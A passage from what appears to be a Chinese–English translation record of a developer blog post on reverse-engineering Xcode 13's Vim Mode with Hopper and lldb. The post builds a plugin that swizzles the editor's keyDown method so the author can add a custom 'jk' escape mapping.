\u884c\uff1b\u65ad\u70b9\u786e\u5b9e\u547d\u4e2d\u4e86\uff01\u76ee\u6807 0\uff1a(Xcode) \u505c\u6b62\u3002 (lldb ) po $arg1NSEvent: type =KeyDown loc = (544.636,595.392 ) time =111097.2 flags =0x100 win =0x7fb9ace853b0 winNum = 7437 ctxt =0x0 chars = &quot;j&quot; unmodchars = &quot;j&quot; repeat our key&#39;s j \u6309\u952e - \u5230\u76ee\u524d\u4e3a\u6b62\u662f\u6709\u9053\u7406\u7684\u3002\u5982\u679c\u6211\u4eec\u5728 lldb \u4e2d\u8f93\u5165 continue\uff0c\u7136\u540e\u56de\u5230 Xcode\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u6211\u4eec\u5df2\u7ecf\u79fb\u5230\u4e86\u7b2c 2 \u884c\u3002\n\u73b0\u5728\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u662f\u5426\u771f\u7684\u53ef\u4ee5\u5f71\u54cd\u6309\u952e\u7684\u7ed3\u679c\u3002\u56de\u5230 Xcode\uff0c\u6211\u4eec\u53ef\u4ee5\u518d\u6b21\u70b9\u51fb j\uff0c\u5f00\u59cb\u5411\u4e0b\u79fb\u52a8\u5230\u7b2c 3 \u884c\u3002\u4e0d\u8fc7\uff0c\u5728 lldb \u4e2d\uff0c\u6211\u4eec\u5c06\u5b8c\u5168\u8df3\u8fc7\u6b64\u65b9\u6cd5\u7684\u903b\u8f91\u5e76\u63d0\u524d\u8fd4\u56de\u3002\u57fa\u4e8e\u4e0a\u9762\u7684\u5806\u6808\u8ddf\u8e2a\uff0c\u6211\u4eec\u7684 IDEViEventConsumer.handleKeyEventmethod \u9884\u8ba1\u4f1a\u8fd4\u56de\u4e00\u4e2a Bool - \u53ef\u80fd\u8868\u660e\u5b83\u662f\u5426\u5b9e\u9645\u5904\u7406\u4e86\u5173\u952e\u4e8b\u4ef6\u3002\u8ba9\u6211\u4eec\u4ece\u63d0\u524d\u8fd4\u56de true \u5f00\u59cb\uff1a\u76ee\u6807 0: (Xcode ) \u505c\u6b62\u3002 (lldb ) thread return true* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 (lldb ) continue \u5728 Xcode \u4e2d\u68c0\u67e5\u56de\u6765\u540e\uff0c\u6211\u4eec\u4ecd\u7136\u5728\u7b2c 2 \u884c\uff01\u8fd9\u662f\u6709\u9053\u7406\u7684 - \u6211\u4eec\u5df2\u7ecf\u6709\u6548\u5730\u8868\u793a IDEViEventConsumer.handleKeyEvent \u5df2\u7ecf\u6210\u529f\u5904\u7406\u4e86 keyevent\uff0c\u4f46\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u5bf9\u5b83\u505a\u4efb\u4f55\u4e8b\u60c5\u3002\u8ba9\u6211\u4eec\u8bd5\u8bd5\u76f8\u53cd\u3002\u6211\u4eec\u8fd8\u57282\u53f7\u7ebf\uff1b\u518d\u6b21\u70b9\u51fb j \u4f7f\u6211\u4eec\u56de\u5230\u65ad\u70b9\uff1aTarget 0: (Xcode) \u505c\u6b62\u3002 (lldb ) thread return false* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 (lldb) continue \u8bf4 IDEViEventConsumer \u6ca1\u6709\u5904\u7406\u5173\u952e\u4e8b\u4ef6\u610f\u5473\u7740 aj \u5b57\u7b26\u88ab\u63d2\u5165\u5230\u6211\u4eec\u7684\u884c\u4e2d\uff0c\u5c3d\u7ba1\u6211\u4eec\u4e00\u76f4\u5904\u4e8e\u6b63\u5e38\u6a21\u5f0f\uff08\u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u4ecd\u7136\u662f\uff09\u3002\nIDEViEventConsumer.handleKeyEvent \u9884\u8ba1\u5728 Vim \u6a21\u5f0f\u542f\u7528\u65f6\u5904\u7406\u6240\u6709\u6309\u952e\u3002\u6211\u4eec\u7684\u7ebf\u7a0b\u8fd4\u56de false \u610f\u5473\u7740\u6211\u4eec\u9000\u56de\u5230\u4e00\u4e9b\u975e vim \u6a21\u5f0f\u5904\u7406\u7a0b\u5e8f\uff0c\u8fd9\u81ea\u7136\u53ea\u662f\u63d2\u5165\u4e86 aj \u5b57\u7b26\uff1b\u8fd9\u5728\u6b63\u5e38\u4f7f\u7528\u4e2d\u4e0d\u4f1a\u53d1\u751f\u3002 IDEViEventConsumer.handleKeyEvent \u5b9e\u9645\u4e0a\u53ea\u5904\u7406 vim \u6a21\u5f0f\u4e0b\u7684\u4e00\u4e9b\u6309\u952e\uff0c\u4f8b\u5982\u5bfc\u822a\u6216\u6a21\u5f0f\u4e4b\u95f4\u7684\u5207\u6362\u3002\u63d2\u5165\u6a21\u5f0f\u4e0b\u7684\u4e00\u822c\u8f93\u5165\u7531\u94fe\u4e2d\u7a0d\u540e\u7684\u5176\u4ed6\u4e8b\u4ef6\u4f7f\u7528\u8005\u5904\u7406\u3002\u8fd9\u79cd\u533a\u522b\u53ef\u80fd\u4f1a\u5f71\u54cd\u6211\u4eec\u524d\u8fdb\u7684\u9053\u8def\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u770b\u770b\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u627e\u51fa\u54ea\u4e2a\u662f\u6b63\u786e\u7684\u3002\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u68c0\u67e5\u6b64\u65b9\u6cd5\u5728\u4e0d\u540c\u573a\u666f\u4e2d\u8fd4\u56de\u7684\u503c\u3002\u56de\u5230 Xcode\uff0c\u518d\u6b21\u6309\u4e0b j \u6765\u51fb\u4e2d\u6211\u4eec\u7684\u65ad\u70b9\u2014\u2014\u8fd9\u4e00\u6b21\uff0c\u8ba9\u6211\u4eec\u8df3\u51fa\u6846\u67b6\uff0c\u7136\u540e\u68c0\u67e5 rax \u5bc4\u5b58\u5668\u4ee5\u67e5\u770b\u8fd4\u56de\u7684\u503c\uff1a \u6ce8\u610f\uff1a\u5982\u679c\u60a8\u8bd5\u56fe\u590d\u5236\u8fd9\u7bc7\u6587\u7ae0\u4e2d\u7684\u6b65\u9aa4\u4e00\u4e2a\u57fa\u4e8e M1 \u7684 Mac\uff0c\u8fd9\u91cc\u7684\u8fd4\u56de\u503c\u5e94\u8be5\u662f $x0\uff1b\u8bf7\u6ce8\u610f\uff0c\u6211\u8fd8\u6ca1\u6709\u5728 M1 \u4e0a\u6d4b\u8bd5\u8fc7\u8fd9\u7bc7\u6587\u7ae0\u7684\u4efb\u4f55\u90e8\u5206 - \u62b1\u6b49\uff01 (lldb)finish* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = step out (lldb ) p $rax (unsigned long ) $7 = 1 \u90a3 1 \u8868\u793a\u6211\u4eec\u7684\u65b9\u6cd5\u8fd4\u56de\u771f\uff0c\u5e76\u4e14\u662f\u8d1f\u8d23\u76f8\u5e94\u5730\u5904\u7406\u6211\u4eec\u7684 j \u6309\u4e0b\u3002\u63a5\u4e0b\u6765\uff0c\u8ba9\u6211\u4eec\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\uff1b\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u76f8\u540c\u7684\u8fc7\u7a0b\u518d\u6b21\u67e5\u770b\u8fdb\u5165\u8be5\u6a21\u5f0f\u7684 i \u6309\u952e\u7684\u8fd4\u56de\u503c 1\u3002\n(lldb)finish* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = step out (lldb) p $rax (unsigned long ) $9 = 0 \u8fd9\u8bc1\u5b9e\u4e86 - IDEViEventConsumer.handleKeyEvent \u5b9e\u9645\u4e0a\u5e76\u4e0d\u8d1f\u8d23\u7528\u4e8e\u5728\u63d2\u5165\u6a21\u5f0f\u4e0b\u5904\u7406\u4e8b\u4ef6\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u5728 SourceEditor.SourceEditorView.keyDown \u4e2d\u6302\u94a9\u5806\u6808\u4e0a\u4e00\u5c42\u7684\u5185\u5bb9\u3002\u8fd9\u53ef\u80fd\u4f1a\u4f7f\u4e00\u4e9b\u4e8b\u60c5\u53d8\u5f97\u66f4\u96be\uff08\u6bd4\u5982\u627e\u51fa vim \u7279\u5b9a\u7684\u4e0a\u4e0b\u6587\uff0c\u6bd4\u5982\u6211\u4eec\u6240\u5904\u7684\u6a21\u5f0f\uff1b\u5927\u6982\uff0c\u4ece\u4e00\u4e2a\u540d\u4e3a IDEViEventConsumer \u7684\u7c7b\u4e2d\u8bbf\u95ee\u5b83\u4f1a\u66f4\u5bb9\u6613\uff01\uff09\uff0c\u4f46\u4e3a\u4e86\u8ba9\u6211\u4eec\u5728\u5176\u4e2d\u64cd\u4f5c\u4e8b\u4ef6\uff0c\u8fd9\u662f\u5fc5\u8981\u7684\u63d2\u5165\u6a21\u5f0f\u3002\u518d\u8bf4\u4e00\u6b21\uff0c\u5b83\u53ef\u80fd\u4f1a\u8ba9\u4e00\u4e9b\u4e8b\u60c5\u53d8\u5f97\u66f4\u5bb9\u6613 - \u4ece\u4e0a\u9762\u7684\u5806\u6808\u8ddf\u8e2a\u6765\u770b\uff0c\u770b\u8d77\u6765 SourceEditor.SourceEditorView.keyDown \u6709\u4e00\u4e2a @objc \u5165\u53e3\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5e94\u8be5\u80fd\u591f\u8c03\u6574\u5b83\u3002\u8fd9\u5c06\u8ba9\u6211\u4eec\u514d\u4e8e\u5c1d\u8bd5\u6302\u94a9 swift-only \u65b9\u6cd5\u7684\u5927\u91cf\u9ebb\u70e6\u3002\u8fd9\u53ef\u80fd\u4f1a\u5728\u67d0\u4e2a\u65f6\u5019\u62c6\u5206\u6210\u81ea\u5df1\u7684\u5e16\u5b50\uff0c\u56e0\u4e3a\u6211\u603b\u662f\u5f88\u96be\u627e\u5230\u4e00\u4e9b\u6700\u65b0\u7684\u6b65\u9aa4\u6765\u5236\u4f5c Xcode \u63d2\u4ef6\u3002\u6211\u8ba4\u4e3a\u6709\u4e00\u4e9b\u6a21\u677f\u53ef\u80fd\u5f88\u6709\u7528\uff0c\u4f46\u662f\u6211\u901a\u5e38\u66f4\u559c\u6b22\u77e5\u9053\u6211\u6b63\u5728\u6539\u53d8\u4ec0\u4e48\uff0c\u7279\u522b\u662f\u5f53\u6b65\u9aa4\u5f88\u5c11\u65f6\uff0c\u6240\u4ee5\uff1a\u4ece\u6587\u4ef6 &gt; \u65b0\u5efa\u9879\u76ee\u5f00\u59cb\uff0c\u7136\u540e\u9009\u62e9 macOS Bundle \u6a21\u677f\u3002\u9879\u76ee\u540d\u79f0\uff08\u6211\u4f7f\u7528\u7684\u662f XcodeVimMap\uff09\u548c\u7ec4\u7ec7\u6807\u8bc6\u7b26\u60a8\uff0c\u4f46\u5c06 Bundle Extension \u66f4\u6539\u4e3a xcplugin\u3002\u4f7f\u7528 File &gt; New &gt; File, Cocoa Class \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684 Obj-C \u5934\u6587\u4ef6/\u5b9e\u73b0\u6587\u4ef6\u3002\u6211\u4e5f\u5c06\u4f7f\u7528\u6211\u7684\u9879\u76ee\u540d\u79f0\u4f5c\u4e3a\u6b64\u7c7b\u540d\u79f0 - XcodeVimMap\u3002\n\u5728\u6346\u7ed1\u5305\u7684 Info.plist \u4e2d\uff0c\u6dfb\u52a0\u4e00\u4e2a\u6570\u7ec4\u7c7b\u578b\u7684\u65b0 DVTPlugInCompatibilityUUIDs \u952e\u3002\u6dfb\u52a0\u60a8\u6b63\u5728\u5f00\u53d1\u7684 Xcode \u5e94\u7528\u7a0b\u5e8f\u7248\u672c\u7684\u5173\u8054 UUID \u4f5c\u4e3a\u6570\u7ec4\u4e2d\u7684\u5b57\u7b26\u4e32\u9879\uff1b\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\u83b7\u53d6 UUID\uff1a\u5c06 Principal Class \u952e\u66f4\u65b0\u4e3a\u60a8\u521b\u5efa\u7684\u7c7b\u7684\u540d\u79f0\u3002\u5982\u679c\u4f60\u53ea\u6709\u4e00\u4e2a\u7c7b\uff0c\u8fd9\u4e0d\u662f\u4e25\u683c\u9700\u8981\u7684\uff0c\u4f46\u53ef\u4ee5\u4e3a\u4f60\u8282\u7701\u4e00\u4e9b\u75db\u82e6\u3002\u5982\u679c\u8fd9\u662f\u60a8\u4e3a\u6b64 Xcode \u526f\u672c\u5b89\u88c5\u7684\u7b2c\u4e00\u4e2a Xcode \u63d2\u4ef6\uff0c\u8bf7\u91cd\u65b0\u7b7e\u7f72 Xcode\uff08\u8fd9\u53ef\u80fd\u4f1a\u5bfc\u81f4\u60a8\u7684 Xcode \u5b89\u88c5\u51fa\u73b0\u95ee\u9898\uff0c\u4f46\u6211\u771f\u7684\u6ca1\u6709\u8d44\u683c\u77e5\u9053\u5b83\u4eec\u662f\u4ec0\u4e48\u6216\u8c08\u8bba\u5b83\u4eec\uff1b\u4f46\u662f\u5982\u679c\u60a8\u7b2c\u4e00\u6b21\u6d89\u8db3\u63d2\u4ef6\uff0c\u53ef\u80fd\u4f1a\u505a\u4e00\u4e9b\u7814\u7a76\uff09\u3002\u5982\u679c\u60a8\u6b63\u786e\u8bbe\u7f6e\u4e86\u6240\u6709\u5185\u5bb9\uff0c\u60a8\u5e94\u8be5\u5728 Xcode \u4e2d\u6536\u5230\u4e00\u4e2a\u63d0\u793a\uff0c\u8be2\u95ee\u60a8\u662f\u5426\u8981\u52a0\u8f7d\u5305\uff08\u610f\u5916\u4ee3\u7801\u5305\u201c...\u201d\uff09\u3002\u8bf7\u6ce8\u610f\uff0c\u60a8\u60f3\u8981\u7684\u6309\u94ae\u662f\u672a\u7a81\u51fa\u663e\u793a\u7684\u6309\u94ae\u3002\u52a0\u8f7d\u5305\u540e\uff0c\u60a8\u5e94\u8be5\u5728\u7ec8\u7aef\u4e2d\u770b\u5230 XcodeVimMap Loaded \u8f93\u51fa\u3002\u6ce8\u610f\uff1a\u5982\u679c\u60a8\u770b\u5230\u4efb\u4f55\u6709\u5173\u672a\u52a0\u8f7d\u63d2\u4ef6\u7684\u8f93\u51fa\uff0c\u4f8b\u5982\u5728\u8def\u5f84&#39;.../XcodeVimMap.xcplugin&#39;\u5904\u8df3\u8fc7\u63d2\u4ef6\uff0c\u5219\u53ef\u80fd\u4e0e\u4e0a\u9762\u6307\u5b9a\u7684Info.plist\u503c\u6709\u5173\uff1b\u5728\u505a\u4efb\u4f55\u5176\u4ed6\u4e8b\u60c5\u4e4b\u524d\u4ed4\u7ec6\u68c0\u67e5\u5b83\u4eec\u3002\u5982\u679c\u4e00\u5207\u6b63\u5e38\uff0c\u60a8\u53ef\u4ee5\u6267\u884c\u4e24\u4e2a\u989d\u5916\u7684\u6b65\u9aa4\u6765\u52a0\u5feb\u5f00\u53d1\u901f\u5ea6\uff1a\u5728\u76ee\u6807\u7684\u6784\u5efa\u8bbe\u7f6e\u4e2d\uff0c\u5c06\u5b89\u88c5\u6784\u5efa\u4ea7\u54c1\u4f4d\u7f6e\u66f4\u6539\u4e3a $(HOME)\uff0c\u5c06\u5b89\u88c5\u76ee\u5f55\u66f4\u6539\u4e3a /Library/Application Support/Developer/Shared/Xcode/\u63d2\u4ef6\u3002\u8fd9\u5c06\u9632\u6b62\u60a8\u5728\u6bcf\u6b21\u6784\u5efa\u540e\u90fd\u5fc5\u987b\u590d\u5236\u4ea7\u54c1\u3002\n\u5728\u60a8\u7684\u65b9\u6848\u8bbe\u7f6e\u4e2d\uff0c\u5728 Run \u9009\u9879\u5361\u548c Info \u5b50\u9009\u9879\u5361\u4e0a\uff0c\u5c06\u60a8\u7684 Executable \u66f4\u6539\u4e3a\u60a8\u6b63\u5728\u5f00\u53d1\u7684 Xcode \u7684\u526f\u672c\u3002\u8fd9\u5c06\u8ba9\u60a8\u70b9\u51fb Run \u6309\u94ae\u4ee5\u5728\u6784\u5efa\u540e\u542f\u52a8\u53e6\u4e00\u4e2a Xcode \u5b9e\u4f8b\uff0c\u67e5\u770b\u5b83\u7684\u65e5\u5fd7\u8f93\u51fa\uff0c\u5e76\u8c03\u8bd5\u5b83\u3002\u8bf7\u6ce8\u610f\uff0c\u5728\u64b0\u5199\u672c\u6587\u65f6\uff0c\u60a8\u8fd8\u5fc5\u987b\u53d6\u6d88\u9009\u4e2d\u201c\u9009\u9879\u201d\u5b50\u9009\u9879\u5361\u4e2d\u7684\u201c\u542f\u7528\u7528\u6237\u754c\u9762\u8c03\u8bd5\u201d\uff0c\u5426\u5219\u60a8\u5c06\u6536\u5230\u6709\u5173\u65e0\u6cd5\u52a0\u8f7d\u8c03\u8bd5\u5668\u63d2\u4ef6\u7684\u9519\u8bef\u6d88\u606f\u3002 Xcode \u8fde\u63a5\u8c03\u8bd5\u5668\u65f6\u901f\u5ea6\u76f8\u5f53\u6162\uff0c\u56e0\u6b64\u5982\u679c\u8c03\u8bd5\u5668\u4e0d\u662f\u60a8\u5de5\u4f5c\u6d41\u7a0b\u7684\u6838\u5fc3\u90e8\u5206\uff0c\u5219\u503c\u5f97\u53d6\u6d88\u9009\u4e2d\u201c\u4fe1\u606f\u201d\u5b50\u9009\u9879\u5361\u4e2d\u7684\u201c\u8c03\u8bd5\u53ef\u6267\u884c\u6587\u4ef6\u201d\u6846 - \u5c3d\u7ba1\u6211\u4eec\u5c06\u5728\u672c\u6587\u7684\u90e8\u5206\u5185\u5bb9\u4e2d\u4f7f\u7528\u5b83\u3002\u5b8c\u6210\u6240\u6709\u8fd9\u4e9b\u4e4b\u540e\uff0c\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u8bbe\u7f6e\u4e86\u4e00\u4e2a\u901a\u7528\u7684 Xcode \u63d2\u4ef6\u2014\u2014\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u5f00\u59cb\u5411\u5176\u4e2d\u6dfb\u52a0\u4e00\u4e9b\u7279\u5b9a\u4e8e vim \u7684\u4ee3\u7801\u3002\u6211\u4eec\u4e4b\u524d\u786e\u5b9a SourceEditor.SourceEditorView.keyDown \u53ef\u80fd\u662f\u6b64\u5904\u5b9a\u4f4d\u7684\u7406\u60f3\u65b9\u6cd5\uff0c\u6240\u4ee5\u8ba9\u6211\u4eec\u4ece\u5728\u6211\u4eec\u7684\u63d2\u4ef6\u4e2d\u6df7\u5408\u5b83\u5f00\u59cb\u3002\u9996\u5148\uff0c\u8ba9\u6211\u4eec\u5728 pluginDidLoad \u4e2d\u7684 NSLog \u8bed\u53e5\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u65ad\u70b9\uff1a\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u67e5\u770b\u6211\u4eec\u60f3\u8981 swizzle \u7684\u7c7b\u662f\u5426\u5728\u6b64\u65f6\u771f\u6b63\u52a0\u8f7d\u4e86\uff1a\u770b\u8d77\u6765\u7c7b\u5c1a\u672a\u52a0\u8f7d\u3002\u6211\u4eec\u77e5\u9053\u5b83\u662f\u5728 SourceEditor \u6846\u67b6\u4e2d\u5b9a\u4e49\u7684\uff0c\u6211\u4eec\u5728\u672c\u6587\u9876\u90e8\u9644\u8fd1\u770b\u5230\u4e86\u8def\u5f84\uff1b\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 dlopen \u63d0\u524d\u52a0\u8f7d\u5b83\uff1a // #import &lt;dlfcn.h&gt; for dlopen NSString * xcodePath = [ [ NSBundle mainBundle ] bundlePath ] ; NSString * sourceEditorPath = [ xcodePath stringByAppendingPathComponent : @&quot;Contents/SharedFrameworks/SourceEditor.framework/Versions/A/SourceEditor&quot;]; dlopen([sourceEditorPath cStringUsingEncoding: NSUTF8StringEncoding], RTLD_NOW); NSLog ( @&quot; [XcodeVimMap] SourceEditor Loaded &quot;) ;\n\u5982\u679c\u6211\u4eec\u5728\u8fd9\u4e2a\u65b0\u7684 NSLog \u8bed\u53e5\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u65ad\u70b9\u5e76\u91cd\u65b0\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u6211\u4eec\u7684\u7c7b\u73b0\u5728\u5df2\u7ecf\u52a0\u8f7d\uff1a\u6211\u4eec\u73b0\u5728\u5e94\u8be5\u80fd\u591f\u76f8\u5e94\u5730\u8bbe\u7f6e\u6211\u4eec\u7684 swizzle\u3002\u8bf7\u6ce8\u610f\uff0c\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u5947\u602a\u7684\u683c\u5f0f\uff0c\u6211\u4eec\u5728\u51fd\u6570\u6307\u9488\u4e2d\u4fdd\u7559\u5bf9\u539f\u59cb\u5b9e\u73b0\u7684\u5f15\u7528\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u4f7f\u7528 method_exchangeImplementations\uff1b\u6211\u5728\u901a\u5e38\u7684\u8bbe\u7f6e\u4e2d\u9047\u5230\u4e86\u4e00\u4e9b\u5947\u602a\u7684\u95ee\u9898\uff0c\u5b81\u613f\u5c06\u76f8\u5173\u7684\u8c03\u8bd5\u5de5\u4f5c\u4fdd\u5b58\u5728\u8fd9\u7bc7\u6587\u7ae0\u7684\u5176\u4ed6\u5730\u65b9 - \u6709\u4e9b\u4e1c\u897f\u544a\u8bc9\u6211\u6211\u9700\u8981\u5b83\u3002 // #import &lt;AppKit/AppKit.h&gt; for NSEvent // #import &lt;objc/runtime.h&gt; for runtime fun // \u4fdd\u5b58\u539f\u59cb\u65b9\u6cd5\u5b9e\u73b0 static BOOL ( * originalKeyDown ) ( id self , SEL _cmd , NSEvent * event ); // \u8bb0\u5f55\u6309\u952e\u4e8b\u4ef6\uff0c\u7136\u540e\u8f6c\u53d1\u5230\u539f\u59cb\u5b9e\u73b0 - ( BOOL ) swizzled_keyDown: ( NSEvent * ) event { NSLog ( @&quot; [XcodeVimMap] Got Characters: %@ &quot; , event . characters ) ; return originalKeyDown( self , _cmd , event ) ; } + ( void ) pluginDidLoad: ( NSBundle * ) plugin { // ... Method originalMethod = class_getInstanceMethod ( NSClassFromString ( @&quot; SourceEditor.SourceEditorView &quot; ) , NSSelectorFromString ( @&quot; keyDown: &quot; ) ) ;\u65b9\u6cd5replacementMethod = class_getInstanceMethod([self class],@selector(swizzled_keyDown:)); // \u4fdd\u5b58\u539f\u59cb\u5b9e\u73b0\uff0c\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5 // \u4ece `swizzled_keyDown` \u4e2d\u8c03\u7528\u5b83 originalKeyDown = ( void * ) method_getImplementation ( originalMethod ) ; // \u66ff\u6362\u65b9\u6cd5 method_setImplementation ( originalMethod , method_getImplementation ( replacementMethod ) ) ; } [XcodeVimMap] Plugin Loaded[XcodeVimMap] SourceEditor Loaded[XcodeVimMap] Got Characters: G (//\u79fb\u52a8\u5230\u6587\u4ef6\u672b\u5c3e)[XcodeVimMap] Got Characters: i (//\u5207\u6362\u5230\u63d2\u5165\u6a21\u5f0f)[XcodeVimMap] Got Characters: H[ XcodeVimMap] \u5f97\u5230\u5b57\u7b26\uff1ae[XcodeVimMap] \u5f97\u5230\u5b57\u7b26\uff1al[XcodeVimMap] \u5f97\u5230\u5b57\u7b26\uff1al[XcodeVimMap] \u5f97\u5230\u5b57\u7b26\uff1ao[XcodeVimMap] \u5f97\u5230\u5b57\u7b26......", "note_en": "I&#39;ve tried to make it clear in the title, but hopefully you haven&#39;t gotten to this page thinking thatApple provides a built-in way to add custom key mappings in Xcode\u00a013&#39;s new Vim Mode.Unfortunately, this functionality just isn&#39;t easily configurable.\n Instead, this is one of those \u201cbut everything&#39;s a  little configurable with enough swizzling &amp; pointer arithmetic\u201d kind of posts.\n      First things first: Xcode\u00a013 is the first Xcode release to offer a built-in Vim Mode!\n   This is huge news - I&#39;ve only really gotten into vim in the last few years,but it&#39;s one of those things that I don&#39;t think I could ever leave behind at this point.\n I&#39;m a big fan of the  XVim plugin for this reason, so seeing vim functionality added directly to Xcode is great.This is especially true since XVim is the last Xcode plugin I still commonly use - proper vim functionality in Xcode might mean not having to worry about managing plugins at all in the future.\n That being said, while this is a significant step forward either way,it&#39;s not exactly a full implementation, as indicated by Apple&#39;s own fairly toned-down description:\n Many common key combinations and editing modes familiar to Vim users are supported directly within the code editor&amp;mldr\n  Of course there are some bits of functionality that I&#39;ve found myself missing when using it so far - apparently I like to jump to specific line numbers using commands like  :25 a lot -but this feature has launched with enough functionality to cover what I want to do the majority of the time.\n Except for one big thing, which I have so far been unable to get over - I do normally have my escape key mapped to something else.\n Well, in insert mode, at least. That part of my  .vimrc file looks like this:\n  &amp;mldr which is really wonderful - it maps a  sequence of keys - the  j key, followed by the  k key in quick succession - to exit insert mode.It&#39;s a common mapping, and for good reason - it&#39;s just a quick double-tap on the home row to switch modes.\n   The keys used - along with the exact behavior, where you get a sort of \u201cfake\u201d  juntil it resolves based on another keypress or a timeout - makes this a difficultthing to implement using software outside of Xcode.\n But not only is it a core part of my muscle memory now(I was surprised how much the characters  jk kept appearing in Xcode without this mapping available),but also something that I just don&#39;t want to get rid of; I found this to be my preference ages ago, and I don&#39;t wantto learn something else just to appease Xcode.\n    As is often the case with this sort of thing, we only really have a couple of steps to cover:\n  So let&#39;s start with the first. When using Vim Mode, Xcode includes a new bottom bar that lists some currently-available actions:\n   One good starting option is to search for those action names and try to find where they&#39;re used - it&#39;s not a super-precise method, but it&#39;s fast and often works.\n  A single match in a framework called  SourceEditor - if anything I&#39;d expect a match in a localized file,containing something like  &#34;YANK_DESCRIPTION&#34; = &#34;yank (copy)&#34;, after which we would search for  YANK_DESCRIPTION. But hey, works for me!\n Next we can open  SourceEditor in a disassembler like  Hopper, and then search for our \u201cyank (copy)\u201d string again.This gives a result that appears to be referenced by a function named  SourceEditor.ViYankToEndOfParagraphDownCommand.init:\n  A class name starting with  Vi is good news!We have more digging to do, but the  SourceEditor framework seems like the right place to start.\n   Tracing through the rest of this using a disassembler is probably more effort than it&#39;s worth.\n Instead, let&#39;s open up Xcode\u00a013, attach a debugger to it, and put a breakpoint on all of the  SourceEditor.ViYankToEndOfParagraphDownCommand methods.That way, if we perform a yank-to-end-of-paragraph in Vim Mode, we should hit our breakpoint.\n % lldb (lldb ) process attach --name XcodeProcess  20279 stopped (lldb ) b -r  &#34;SourceEditor.ViYankToEndOfParagraphDownCommand&#34;Breakpoint 1:  22 locations. (lldb )  continueProcess  20279 resuming\n It is at this point that I am realizing that I have no idea how to yank to the end of a paragraph. Google says  y}?\n That doesn&#39;t seem to hit the breakpoint though, and it&#39;s unclear if it&#39;s from me doing the wrong thing or if this breakpoint didn&#39;t land somewhere useful.\n Looking back in Hopper for other  SourceEditor.Vi-prefixed classes,  SourceEditor.ViReplaceCharacterCommandHandler jumps out as a good second option.I definitely know how to replace a character (should be  r, followed by the replacement) and this class has a  CommandHandler suffix rather than just  Command - sounds like something that definitely shouldhave a method called on it when a replacement happens.\n  Target 0:  (Xcode ) stopped. (lldb ) bt* thread  #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.6 * frame  #0: 0x12adc4ec0 SourceEditor`protocol witness for SourceEditor.CommandHandler.selectionMode.getter : Swift.Optional&lt;SourceEditor.SourceEditorView.SourceEditorSelectionMode&gt; in conformance SourceEditor.ViReplaceCharacterCommandHandler : SourceEditor.CommandHandler in SourceEditor frame  #1: 0x12afb1882 SourceEditor`SourceEditor.CommandInterface.performCommandWithSelector(_: ObjectiveC.Selector, sender: Swift.Optional&lt;Any&gt;, arguments: Swift.Optional&lt;Any&gt;...) throws -&gt; () + 242 frame  #2: 0x12ade19fe SourceEditor`SourceEditor.SourceEditorView.perform(_: Swift.Optional&lt;ObjectiveC.Selector&gt;, with: Swift.Optional&lt;Any&gt;) -&gt; Swift.Optional&lt;Swift.Unmanaged&lt;Swift.AnyObject&gt;&gt; + 286 frame  #3: 0x12ade1b0e SourceEditor`@objc SourceEditor.SourceEditorView.perform(_: Swift.Optional&lt;ObjectiveC.Selector&gt;, with: Swift.Optional&lt;Any&gt;) -&gt; Swift.Optional&lt;Swift.Unmanaged&lt;Swift.AnyObject&gt;&gt; + 126 frame  #4: 0x12afc7b20 SourceEditor`SourceEditor.ViCommand.perform(actions: Swift.Array&lt;ObjectiveC.Selector&gt;, context: SourceEditor.ViEventConsumer.Context) -&gt; SourceEditor.ViCommand.PerformResult + 288 frame  #5: 0x12afc7c1b SourceEditor`SourceEditor.ViCommand.perform(context: SourceEditor.ViEventConsumer.Context) -&gt; SourceEditor.ViCommand.PerformResult + 43 frame  #6: 0x12afeb894 SourceEditor`SourceEditor.ViEventConsumer.(perform in _383C3123AEDAAFA7B0BF64D9906E584E)(command: SourceEditor.ViCommand, context: SourceEditor.ViEventConsumer.Context) -&gt; SourceEditor.ViCommand.PerformResult + 52 frame  #7: 0x12afebfbb SourceEditor`SourceEditor.ViEventConsumer.(handle in _383C3123AEDAAFA7B0BF64D9906E584E)(commands: Swift.Array&lt;SourceEditor.ViCommand&gt;, context: SourceEditor.ViEventConsumer.Context) -&gt; Swift.Optional&lt;SourceEditor.ViCommand.PerformResult&gt; + 1211 frame  #8: 0x12afec603 SourceEditor`SourceEditor.ViEventConsumer.handleKeyEvent(_: __C.NSEvent, in: SourceEditor.SourceEditorView) -&gt; Swift.Bool + 1443 frame  #9: 0x13b38fe1a IDESourceEditor`IDESourceEditor.IDEViEventConsumer.handleKeyEvent(_: __C.NSEvent, in: SourceEditor.SourceEditorView) -&gt; Swift.Bool + 938 frame  #10: 0x12b0de385 SourceEditor`SourceEditor.SourceEditorView.keyDown(with: __C.NSEvent) -&gt; () + 405 frame  #11: 0x12b0de47f SourceEditor`@objc SourceEditor.SourceEditorView.keyDown(with: 